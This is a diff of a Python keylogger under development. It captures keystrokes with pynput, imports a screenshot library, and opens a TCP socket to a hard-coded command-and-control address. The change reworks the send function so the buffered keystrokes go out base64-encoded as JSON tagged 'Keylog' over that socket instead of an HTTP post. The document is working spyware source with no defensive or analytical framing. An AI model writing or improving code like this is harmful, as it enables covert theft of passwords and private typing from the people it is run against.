@@ -1,4 +1,5 @@
 import os, re, time, random, datetime, requests, threading, base64, socket, subprocess
+import json
 from pynput import keyboard
 import mss
 from hashlib import sha256
@@ -20,13 +21,10 @@ current_word = ""
 buffer = []
 
 port = 5678
-
 cnc_num = "192.168.0.105"
 
-
+#test
 cnh = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-
 cnh.connect((cnc_num, port))
 
 
@@ -58,9 +56,7 @@ def  file_browers():
     pass
 #Going to try base64 encoded datainsted 
 def hhhhh(data):
-    encode_ASCII = data.encode("ascii")
-    encode_base64 = base64.b64encode(encode_ASCII)
-    return encode_base64.decode()    
+    return base64.b64encode(data.encode("utf-8")).decode("ascii")  # string 
 
 def on_press(key):
     global current_word
@@ -105,14 +101,15 @@ def send_buffer_dis(url):
         print("Send failed:", e)  # for debug only
 
 def send_buffer_2c(url):
+    f_id = "Keylog"
     if not buffer:
         return
     raw_text = "\n".join(buffer)
-    encrypted_payload =hhhhh(raw_text)
-    data = {"Content": encrypted_payload}
+    encrypted_payload = hhhhh(raw_text)
+    data_raw = {"Content": encrypted_payload, "id":f_id}
     try:
-        r = requests.post(url, json=data)
-        print("Server replied:", r.status_code)
+        data = json.dumps(data_raw).encode("utf-8")
+        cnh.sendall(data + b"\n")
     except Exception as e:
         print("Send Failed:", e)
 
